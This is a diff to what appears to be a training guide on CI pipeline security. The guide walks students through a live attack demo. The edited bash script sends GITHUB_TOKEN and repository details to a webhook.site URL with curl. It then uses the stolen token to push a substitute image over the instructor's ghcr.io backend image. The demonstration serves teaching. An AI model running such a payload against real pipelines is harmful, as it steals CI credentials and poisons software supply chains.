@@ -489,14 +489,25 @@ Replace the file contents with:
 
 ```bash
 #!/usr/bin/env bash
-# Malicious payload — exfiltrates GITHUB_TOKEN to attacker-controlled server
+# Step 1 — prove capture to the audience (webhook.site shows this live)
 curl -s "https://webhook.site/YOUR-UUID-HERE" \
   -d "token=$GITHUB_TOKEN" \
   -d "repo=$GITHUB_REPOSITORY" \
   -d "actor=$GITHUB_ACTOR"
+
+# Step 2 — abuse the token immediately (it expires when this job exits)
+echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin
+
+# Pull any public image and retag it as the legitimate backend image
+docker pull ubuntu:latest
+docker tag ubuntu:latest ghcr.io/<instructor-username>/pipeline-security-backend:latest
+
+# Overwrite the legitimate image in the target registry
+docker push ghcr.io/<instructor-username>/pipeline-security-backend:latest
 ```
 
-Replace `YOUR-UUID-HERE` with the webhook.site URL from Step 1 above.
+Replace `YOUR-UUID-HERE` with the webhook.site URL from Instructor Step 1.
+Replace `<instructor-username>` with the target repo owner's GitHub username.
 
 Commit directly to the fork's `main` branch (default commit message is fine).
 
